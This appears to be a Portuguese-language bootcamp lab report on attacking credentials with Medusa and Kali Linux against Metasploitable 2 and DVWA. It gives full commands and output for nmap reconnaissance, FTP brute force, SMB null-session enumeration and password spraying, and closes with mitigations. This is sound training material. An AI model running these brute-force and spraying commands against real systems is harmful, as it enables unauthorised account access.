# Simulando Ataques de Força Bruta com Medusa e Kali Linux

Projeto prático do Bootcamp Santander — Cibersegurança do Zero à Prática (DIO).
Laboratório controlado de auditoria de credenciais contra ambientes propositalmente vulneráveis (Metasploitable 2 e DVWA), utilizando Kali Linux e a ferramenta Medusa.

---

## Nota sobre o uso de Inteligência Artificial

Este relatório foi **anotado e organizado com o auxílio de IA**, o que ilustra um dos grandes avanços da Inteligência Artificial no mundo da cibersegurança. Hoje a IA é aplicada para diversas finalidades na área: automatizar o uso de ferramentas de forma mais rápida, estruturar anotações e gerar relatórios organizados como este, acelerar pesquisa e aprendizado, entre outras.

O ponto fundamental: **a IA é uma ferramenta de apoio, não um substituto do conhecimento técnico**. Todo comando foi compreendido, revisado e executado manualmente em ambiente controlado antes de ser documentado. A recomendação é sempre revisar criticamente qualquer saída gerada por IA antes de executá-la.

Use IA com sabedoria — ela é o futuro.

---

## Aviso Legal

Todas as atividades descritas neste documento foram executadas em um laboratório isolado, montado em rede host-only, utilizando máquinas virtuais intencionalmente vulneráveis e de minha propriedade.

Ataques de força bruta, enumeração e password spraying contra sistemas de terceiros sem autorização formal por escrito constituem crime. No Brasil, aplicam-se a Lei 12.737/2012 (Lei Carolina Dieckmann) e o Marco Civil da Internet. Este material tem finalidade exclusivamente educacional: compreender o funcionamento desses ataques e, principalmente, como se defender deles.

---

## Sumário

1. [Objetivos de Aprendizagem](#objetivos-de-aprendizagem)
2. [Conceitos: tipos de ataque a credenciais](#conceitos-tipos-de-ataque-a-credenciais)
3. [Arquitetura do Laboratório](#arquitetura-do-laboratório)
4. [Configuração do Ambiente](#configuração-do-ambiente)
5. [Fase 0 — Reconhecimento com Nmap](#fase-0--reconhecimento-com-nmap)
6. [Cenário 1 — Força Bruta em FTP](#cenário-1--força-bruta-em-ftp)
7. [Cenário 2 — Força Bruta em Formulário Web (DVWA)](#cenário-2--força-bruta-em-formulário-web-dvwa)
8. [Cenário 3 — Enumeração SMB e Password Spraying](#cenário-3--enumeração-smb-e-password-spraying)
9. [Wordlists](#wordlists)
10. [Evidências](#evidências)
11. [Medidas de Mitigação](#medidas-de-mitigação)
12. [Conclusão e Aprendizados](#conclusão-e-aprendizados)
13. [Referências](#referências)

---

## Objetivos de Aprendizagem

- Compreender ataques de força bruta em diferentes serviços (FTP, Web e SMB);
- Diferenciar brute force, password spraying e credential stuffing;
- Utilizar Kali Linux e Medusa para auditoria de credenciais em ambiente controlado;
- Documentar o processo técnico de forma clara, reproduzível e estruturada;
- Reconhecer configurações inseguras comuns e propor mitigações concretas.

---

## Conceitos: tipos de ataque a credenciais

| Técnica | Como funciona | Como detectar |
|---|---|---|
| Brute Force | Testa muitas senhas contra um usuário | Muitas tentativas falhas para a mesma conta |
| Password Spraying | Testa uma senha comum contra muitos usuários | Falhas espalhadas entre várias contas; evita bloqueio por conta |
| Credential Stuffing | Usa pares usuário:senha vazados em outros serviços | Picos de login a partir de credenciais reais reutilizadas |

Medusa foi escolhida por ser um brute-forcer paralelo, modular e estável, adequado a múltiplos hosts e protocolos simultâneos por meio de módulos dedicados (`-M ftp`, `-M smbnt`, `-M ssh`, `-M http`, entre outros).

---

## Arquitetura do Laboratório

```
          Rede Host-Only — 192.168.230.0/24
          ┌──────────────────────────────────────────┐
          │                                            │
   ┌──────┴───────┐                          ┌─────────┴────────┐
   │  KALI LINUX  │   ───── ataque ─────►    │ METASPLOITABLE 2 │
   │  (atacante)  │                          │     (alvo)       │
   │192.168.230.140│                         │ 192.168.230.141  │
   └──────────────┘                          └──────────────────┘
          │                                            │
     Medusa, Nmap,                            FTP (21), SMB (139/445),
     smbclient, enum4linux                    HTTP/DVWA (80), SSH (22)
```

- Rede host-only: garante que o tráfego de ataque não saia para a internet ou rede real.
- Kali Linux: estação do atacante/pentester (192.168.230.140).
- Metasploitable 2: servidor vulnerável expondo FTP, SMB, HTTP (com DVWA) e demais serviços legados (192.168.230.141).

---

## Configuração do Ambiente

### Máquinas Virtuais

| VM | Origem | Rede | Credenciais padrão |
|---|---|---|---|
| Kali Linux | Imagem oficial (kali.org) | Host-Only | kali / kali |
| Metasploitable 2 | Disco virtual da Rapid7 (.vmdk pronto) | Host-Only | msfadmin / msfadmin |

Observação: o Metasploitable 2 não é instalado via ISO. Ele é distribuído como disco virtual pronto; basta criar uma VM apontando para o arquivo `.vmdk` existente.

### Confirmação de conectividade

No Kali, verificar o próprio endereço e alcançar o alvo:

```bash
ip addr
ping -c 3 192.168.230.141
```

### DVWA no Metasploitable 2

O Metasploitable 2 já inclui o DVWA. Acesso pelo navegador do Kali:

```
http://192.168.230.141/dvwa/
```

Login padrão do DVWA: admin / password. Em DVWA Security, definir o nível como Low para o laboratório de brute force.

---

## Fase 0 — Reconhecimento com Nmap

Mapeamento dos serviços expostos antes de qualquer ataque:

```bash
sudo nmap -sV -p 21,22,80,139,445 192.168.230.141
```

Saída obtida (resumida):

```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 00:0C:29:FA:DD:2A (VMware)
```

Foram identificados FTP (vsftpd 2.3.4), HTTP (DVWA) e SMB (Samba 3.0.20), que correspondem aos três vetores analisados nos cenários seguintes.

---

## Cenário 1 — Força Bruta em FTP

Alvo: serviço FTP (porta 21) no Metasploitable 2.
Objetivo: descobrir a senha de um usuário conhecido por força bruta.

### Comando

```bash
medusa -h 192.168.230.141 -u msfadmin -P wordlistss/senhas.txt -M ftp
```

| Flag | Significado |
|---|---|
| -h | host alvo |
| -u | um usuário específico |
| -P | arquivo (lista) de senhas |
| -M ftp | módulo do protocolo FTP |

Nota: `-U` (maiúsculo) indica lista de usuários; `-u` (minúsculo), usuário único. A mesma lógica vale para `-P` e `-p`.

### Resultado obtido

```
ACCOUNT FOUND: [ftp] Host: 192.168.230.141 User: msfadmin Password: msfadmin [SUCCESS]
```

### Validação do acesso

```bash
ftp 192.168.230.141
# Name: msfadmin
# Password: msfadmin
# 230 Login successful.
ftp> ls
```

O login foi concluído com sucesso (`230 Login successful`), confirmando a credencial descoberta.

---

## Cenário 2 — Força Bruta em Formulário Web (DVWA)

Alvo: aplicação DVWA sobre o Apache (porta 80), em nível de segurança Low.

### Comando executado (método do laboratório)

```bash
medusa -h 192.168.230.141 -U wordlistss/users.txt -P wordlistss/senhas.txt -M http \
  -m PAGE:'/dvwa/login.php' \
  -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
  -m FAIL:'Login failed' -t 6
```

### Resultado obtido

```
ACCOUNT FOUND: [http] Host: 192.168.230.141 User: msfadmin Password: password [SUCCESS]
ACCOUNT FOUND: [http] Host: 192.168.230.141 User: msfadmin Password: root     [SUCCESS]
```

### Análise técnica

Durante a execução surgiram avisos `WARNING: Invalid method: PAGE/FORM/FAIL`. Isso acontece porque o módulo `-M http` do Medusa trata de **autenticação HTTP (Basic/Digest)**, e não do preenchimento de formulários HTML — por isso ele ignora os parâmetros `PAGE`, `FORM` e `FAIL`.

Como consequência, os `[SUCCESS]` acima correspondem à resposta HTTP do Apache (status 200) e não a um login real do formulário. O indício é claro e vale registrar: o mesmo usuário retornou SUCCESS para senhas diferentes (`password` e `root`) — o que é impossível para uma credencial verdadeira. Trata-se, portanto, de **falso positivo**.

Saber interpretar a saída da ferramenta é parte essencial do trabalho: evita tomar um falso positivo por acesso válido. Para brute force real em formulário HTML, o módulo adequado seria o `web-form` do Medusa ou o `http-get-form` do Hydra, ambos usando o cookie de sessão `PHPSESSID` (obtido no navegador autenticado, via DevTools → Storage → Cookies) contra a página de laboratório do DVWA (`/dvwa/vulnerabilities/brute/`).

### Mitigação demonstrada

Nos níveis Medium e High, o DVWA adiciona atraso progressivo e token anti-CSRF (`user_token`) a cada requisição, o que inviabiliza o brute force automatizado direto no formulário — uma demonstração prática de defesa (ver seção Medidas de Mitigação).

---

## Cenário 3 — Enumeração SMB e Password Spraying

Simulação de um cenário corporativo mal configurado: um servidor de arquivos (SMB/Samba 3.0.20) com usuários previsíveis e uma senha fraca padronizada.

### Enumeração de usuários

```bash
enum4linux -U 192.168.230.141
```

A ferramenta confirmou que o servidor aceita sessões nulas (`Server allows sessions using username '', password ''`), o que por si só já é uma falha de configuração, e permitiu enumerar usuários e o workgroup (WORKGROUP).

### Password Spraying com Medusa

Em vez de testar muitas senhas em uma conta (o que dispara bloqueios), testa-se uma senha única contra muitos usuários:

```bash
medusa -h 192.168.230.141 -U wordlistss/users.txt -p 'msfadmin' -M smbnt
```

A flag `-p` (minúscula) define uma senha única — é isso que caracteriza o password spraying.

### Resultado obtido

```
ACCOUNT FOUND: [smbnt] Host: 192.168.230.141 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
```

### Validação com smbclient

```bash
smbclient -L //192.168.230.141/ -U msfadmin
```

Compartilhamentos listados com a credencial descoberta:

```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
tmp             Disk      oh noes!
opt             Disk
IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
msfadmin        Disk      Home Directories
```

O acesso aos compartilhamentos (incluindo diretórios home) confirma o comprometimento via credencial fraca reutilizada.

---

## Wordlists

Para o laboratório foram utilizadas wordlists enxutas e didáticas (disponíveis em `/wordlistss`), de modo a tornar o ataque rápido e reproduzível:

- `wordlistss/users.txt` — usuários comuns e enumerados
- `wordlistss/senhas.txt` — senhas fracas frequentes

### Geração de wordlists customizadas

```bash
crunch 6 8 -o custom.txt                          # combinações por tamanho
cewl http://192.168.230.141/dvwa/ -w cewl.txt     # palavras extraídas do site alvo
```

Wordlists já incluídas no Kali:

```
/usr/share/wordlists/rockyou.txt        # requer: sudo gunzip rockyou.txt.gz
/usr/share/seclists/                    # requer: sudo apt install seclists
```

---

## Evidências

As capturas de tela do laboratório estão organizadas em `/images`:

| # | Evidência | Arquivo |
|---|---|---|
| 01 | Conectividade entre Kali e alvo (ping) | images/01-ping.png |
| 02 | Reconhecimento com Nmap | images/02-nmap.png |
| 03 | Medusa — SUCCESS no FTP | images/03-medusa-ftp.png |
| 04 | Validação de login FTP | images/04-ftp-login.png |
| 05 | Brute force no DVWA (módulo http) | images/05-dvwa-medusa.png |
| 06 | Enumeração de usuários (enum4linux) | images/06-enum4linux.png |
| 07 | Password spraying SMB — SUCCESS | images/07-smb-spraying.png |
| 08 | Compartilhamentos via smbclient | images/08-smbclient.png |

---

## Medidas de Mitigação

Esta seção reúne as defesas para cada vetor analisado.

### Gerais (todos os serviços)

- Senhas fortes e únicas, com uso de gerenciador de senhas; proibição de senhas padrão e de dicionário.
- Autenticação multifator (MFA), que neutraliza força bruta mesmo com senha comprometida.
- Política de bloqueio de conta após N tentativas falhas (observando o risco de negação de serviço por bloqueio).
- Rate limiting e atraso progressivo entre tentativas.
- Monitoramento e alertas de logins falhos (SIEM, logs centralizados).
- Fail2ban para banir IPs após tentativas repetidas:

```bash
sudo apt install fail2ban
# configurar jails para sshd, vsftpd etc. em /etc/fail2ban/jail.local
```

### FTP

- Desativar FTP legado e migrar para SFTP/FTPS, com criptografia.
- Desabilitar login anônimo e contas de serviço desnecessárias.

### Web (DVWA e aplicações)

- Token anti-CSRF por requisição (comportamento do DVWA no nível High).
- CAPTCHA ou reCAPTCHA após falhas consecutivas.
- Mensagens de erro genéricas, que não revelem se o usuário existe.
- WAF e rate limiting por IP e por sessão.

### SMB

- Desativar SMBv1 e sessões nulas (null sessions); impor assinatura SMB.
- Aplicar política de senha e bloqueio de conta no domínio.
- Segmentação de rede: SMB não deve ser acessível a partir de redes não confiáveis.
- Remover compartilhamentos e usuários desnecessários.

---

## Conclusão e Aprendizados

O laboratório demonstrou, de ponta a ponta, o ciclo de um ataque a credenciais — reconhecimento, enumeração, força bruta e validação de acesso — aplicado a três serviços distintos (FTP, Web e SMB) com a ferramenta Medusa no Kali Linux.

Principais aprendizados:

- A diferença prática entre brute force e password spraying, e por que o spraying contorna bloqueios de conta.
- A importância do reconhecimento (Nmap) para a escolha do vetor adequado.
- A relevância de usar o módulo correto da ferramenta: o módulo `-M http` do Medusa faz autenticação HTTP, não brute force de formulário HTML; para formulários, usam-se os módulos `web-form` ou o Hydra. Compreender isso evita interpretar falsos positivos como acesso real.
- Como alterações de configuração relativamente simples (token CSRF, atraso progressivo, MFA, fail2ban, desativação de sessões nulas) inviabilizam ataques triviais em ambientes mal configurados.
- A documentação clara é tão relevante quanto a execução do ataque: um relatório reproduzível é o que entrega valor em um trabalho de segurança.

O objetivo final não é comprometer credenciais, e sim compreender o ataque para fortalecer a defesa.

---

## Referências

- Kali Linux — Site Oficial: https://www.kali.org
- Medusa — Documentação: http://www.foofus.net/jmk/medusa/medusa.html
- DVWA — Damn Vulnerable Web Application: https://github.com/digininja/DVWA
- Nmap — Manual Oficial: https://nmap.org/book/
- Metasploitable 2 — Rapid7: https://docs.rapid7.com/metasploit/metasploitable-2/
- OWASP — Brute Force Attack: https://owasp.org/www-community/attacks/Brute_force_attack

---

Desenvolvido por day0 — Bootcamp Santander: Cibersegurança do Zero à Prática (DIO)
